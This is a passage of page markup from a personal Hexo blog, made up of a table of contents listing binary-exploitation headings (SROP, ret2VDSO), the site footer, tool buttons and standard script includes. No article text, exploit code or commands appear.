href="#64-%E4%BD%8D-SROP-%E6%B5%81%E7%A8%8B"><span class="nav-text">64 位 SROP 流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%A7%A6%E5%8F%91-rt-sigreturn-15"><span class="nav-text">第一步：触发 rt_sigreturn(15)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%9C%A8-frame-%E9%87%8C%E5%B8%83%E2%80%9C%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E2%80%9D"><span class="nav-text">第二步：在 frame 里布“真正的利用场景”</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2VDSO"><span class="nav-text">ret2VDSO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-VDSO"><span class="nav-text">什么是 VDSO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BF%A1%E5%8F%B7%E8%BF%94%E5%9B%9E%E6%97%B6%E7%9A%84%E6%A0%88%E9%95%BF%E4%BB%80%E4%B9%88%E6%A0%B7%EF%BC%9F"><span class="nav-text">1. 信号返回时的栈长什么样？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-sys-sigreturn-%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-text">2. sys_sigreturn 需要什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-pop-eax-%E5%9C%A8%E5%B9%B2%E5%98%9B%EF%BC%9F"><span class="nav-text">3. pop eax 在干嘛？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E4%B8%BA%E5%95%A5%E4%B8%8D%E7%94%A8-add-esp-4%EF%BC%8C%E9%9D%9E%E8%A6%81-pop-eax%EF%BC%9F"><span class="nav-text">4. 为啥不用 add esp, 4，非要 pop eax？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%92%8C-SROP-%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3"><span class="nav-text">5. 和 SROP 利用相关</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%9B%B4%E6%8D%A2-VDSO"><span class="nav-text">本地更换 VDSO</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        57 posts in total
                    </span>
                    
                        <span>
                            1223.7k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>